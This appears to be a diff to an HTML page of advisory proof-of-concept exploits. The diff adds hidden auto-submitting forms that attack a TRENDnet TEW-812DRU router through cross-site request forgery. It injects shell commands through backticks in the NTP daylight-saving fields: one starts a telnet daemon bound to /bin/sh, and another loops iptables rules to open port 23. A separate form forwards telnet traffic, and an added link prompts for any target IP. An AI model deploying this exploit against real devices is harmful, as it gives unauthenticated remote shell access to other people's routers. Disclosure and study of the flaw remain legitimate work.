@@ -136,6 +136,70 @@
           <input name="action" type="hidden" value="Apply"/>
           <input name="apply_do" type="hidden" value="setRemoteManagement"/>
          </form>
+         <form action="http://192.168.10.1/uapply.cgi" id="t231" method="post" name="t231" target="a">
+          <input name="page" type="hidden" value="/advanced/single_port.asp"/>
+          <input name="forward_port_enable" type="hidden" value="0"/>
+          <input name="forward_port" type="hidden" value="24"/>
+          <input name="forward_port_proto0" type="hidden" value="tcp"/>
+          <input name="forward_port_from_start0" type="hidden" value="23"/>
+          <input name="forward_port_from_end0" type="hidden" value="23"/>
+          <input name="forward_port_to_ip0" type="hidden" value="192.168.10.1"/>
+          <input name="forward_port_to_start0" type="hidden" value="23"/>
+          <input name="forward_port_to_end0" type="hidden" value="23"/>
+          <input name="schedule0" type="hidden" value="0"/>
+          <input name="forward_port_enable0" type="hidden" value="on"/>
+          <input name="action" type="hidden" value="Apply"/>
+         </form>
+         <form action="http://192.168.10.1/setNTP.cgi" id="t232" method="post" name="t232" target="a">
+          <input name="page" type="hidden" value="/adm/time.asp"/>
+          <input name="DSTenable" type="hidden" value="on"/>
+          <input name="NtpDstEnable" type="hidden" value="1"/>
+          <input name="NtpDstOffset" type="hidden" value="`utelnetd -l /bin/sh`"/>
+          <input name="NtpDstStart" type="hidden" value="030102"/>
+          <input name="tz_daylight_start_month_select" type="hidden" value="03"/>
+          <input name="tz_daylight_start_day_select" type="hidden" value="01"/>
+          <input name="tz_daylight_start_time_select" type="hidden" value="02"/>
+          <input name="NtpDstEnd" type="hidden" value="100102"/>
+          <input name="tz_daylight_end_month_select" type="hidden" value="10"/>
+          <input name="tz_daylight_end_day_select" type="hidden" value="01"/>
+          <input name="tz_daylight_end_time_select" type="hidden" value="02"/>
+          <input name="ntp_server" type="hidden" value="1"/>
+          <input name="NTPServerIP" type="hidden" value="pool.ntp.org"/>
+          <input name="time_zone" type="hidden" value="UCT_11"/>
+          <input name="timer_interval" type="hidden" value="300"/>
+          <input name="manual_year_select" type="hidden" value="2012"/>
+          <input name="manual_month_select" type="hidden" value="01"/>
+          <input name="manual_day_select" type="hidden" value="01"/>
+          <input name="manual_hour_select" type="hidden" value="00"/>
+          <input name="manual_min_select" type="hidden" value="19"/>
+          <input name="manual_sec_select" type="hidden" value="57"/>
+          <input name="timeTag" type="hidden" value="manual"/>
+         </form>
+         <form action="http://192.168.10.1/setNTP.cgi" id="t233" method="post" name="t233" target="a">
+          <input name="page" type="hidden" value="/adm/time.asp"/>
+          <input name="DSTenable" type="hidden" value="on"/>
+          <input name="NtpDstEnable" type="hidden" value="1"/>
+          <input name="NtpDstOffset" type="hidden" value="3600"/>
+          <input name="NtpDstStart" type="hidden" value="030102"/>
+          <input name="tz_daylight_start_month_select" type="hidden" value="03"/>
+          <input name="tz_daylight_start_day_select" type="hidden" value="01"/>
+          <input name="tz_daylight_start_time_select" type="hidden" value="02"/>
+          <input name="NtpDstEnd" type="hidden" value="`count=0;while [ $countle 25 ]; do iptables -I INPUT 1 -p tcp --dport 23 -j ACCEPT;(( count++ ));done;`"/>
+          <input name="tz_daylight_end_month_select" type="hidden" value="10"/>
+          <input name="tz_daylight_end_day_select" type="hidden" value="01"/>
+          <input name="tz_daylight_end_time_select" type="hidden" value="02"/>
+          <input name="ntp_server" type="hidden" value="1"/>
+          <input name="NTPServerIP" type="hidden" value="pool.ntp.org"/>
+          <input name="time_zone" type="hidden" value="UCT_11"/>
+          <input name="timer_interval" type="hidden" value="300"/>
+          <input name="manual_year_select" type="hidden" value="2012"/>
+          <input name="manual_month_select" type="hidden" value="01"/>
+          <input name="manual_day_select" type="hidden" value="01"/>
+          <input name="manual_hour_select" type="hidden" value="00"/>
+          <input name="manual_min_select" type="hidden" value="19"/>
+          <input name="manual_sec_select" type="hidden" value="57"/>
+          <input name="timeTag" type="hidden" value="manual"/>
+         </form>
 		<tr>
           <td>2015/02/26</td>
           <td>Advisory PoC</td>
@@ -203,7 +267,7 @@
            <a href="javascript:trend23pwn()">
             TEW 812DRU CSRF Enable remote telnet
            </a>
-           <a href="javascript:trend23pwn()">
+           <a href="javascript:trend23pwn(ip)" onclick="return ip=prompt('IP:');">
             [SET IP]
            </a>
           </td>
